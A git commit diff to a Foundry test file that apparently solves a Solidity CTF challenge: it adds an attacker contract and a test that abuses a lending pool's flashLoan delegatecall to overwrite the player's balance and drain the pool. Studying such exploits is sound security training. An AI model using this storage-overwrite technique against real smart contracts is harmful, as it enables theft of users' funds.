5d45c8256168437fac00b285f99ae2d935b950c6
ivaniuss <ivan.emi94@gmail.com>
2022-08-30 19:29:56 -0500

    challenge1 done

--- test/1.t.sol
+++ test/1.t.sol
@@ -5,13 +5,28 @@ import "forge-std/Test.sol";
 import "../src/1.sol";
 import "../src/tokens/tokenInsecureum.sol";
 
+/// @dev Using this contract to perform the delegatecall that will overwrite the state value of balances
+contract ContractAttacker {
+
+    IERC20 public token;
+    mapping(address => uint) public balances;
+    constructor(){}
+    bool private _flashLoan;
+    function attack(address _address, uint value) external {
+        balances[_address] = value;
+    }
+}
+
+
 contract InSecureumLenderPoolTest is Test {
     InSecureumLenderPool target;
     InSecureumToken token;
+    ContractAttacker attacker;
     address player;
     function setUp() public {
 
         token = new InSecureumToken(100);
+        attacker = new ContractAttacker();
         target = new InSecureumLenderPool(address(token));
         token.transfer(address(target) ,100);
         uint256 balance = token.balanceOf(address(target));
@@ -22,6 +37,18 @@ contract InSecureumLenderPoolTest is Test {
 
     function testComplete() public {
         vm.startPrank(player);
-        assertTrue(true);
+        target.flashLoan(
+            address(attacker),
+            abi.encodeWithSelector(
+                ContractAttacker.attack.selector, 
+                player, 
+                token.balanceOf(address(target))
+            )
+        );
+        uint256 playerBalance = target.getBalance(player);
+        emit log_named_uint("player balance", playerBalance);
+        target.withdraw(target.getBalance(player));
+
+        assertEq(token.balanceOf(address(target)), 0);
     }
 }
